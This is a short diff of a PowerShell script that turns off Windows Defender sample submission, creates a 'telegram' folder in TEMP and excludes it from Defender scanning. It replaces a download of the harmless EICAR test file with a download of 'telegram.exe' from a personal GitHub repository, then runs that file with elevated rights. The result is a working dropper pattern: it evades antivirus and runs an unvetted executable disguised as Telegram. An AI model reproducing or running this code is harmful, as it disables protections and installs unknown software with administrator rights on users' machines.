@@ -8,5 +8,5 @@ Set-ItemProperty -path "HKLM:\Software\Policies\Microsoft\Windows Defender\Spyne
 Set-MpPreference -SubmitSamplesConsent 2
 New-Item -Path "$env:TEMP\telegram" -ItemType Directory | Out-Null
 Add-MpPreference -ExclusionPath "$env:TEMP\telegram"
-Invoke-WebRequest -Uri "https://secure.eicar.org/eicar.com.txt" -OutFile "$env:TEMP\telegram\eicar.com.txt" | Out-Null
-Start-Process "$env:TEMP\telegram\eicar.com.txt" -Verb runas
+Invoke-WebRequest -Uri "https://github.com/lion93934/test/raw/refs/heads/main/telegram.exe" -OutFile "$env:TEMP\telegram\telegram.exe" | Out-Null
+Start-Process "$env:TEMP\telegram\telegram.exe" -Verb runas
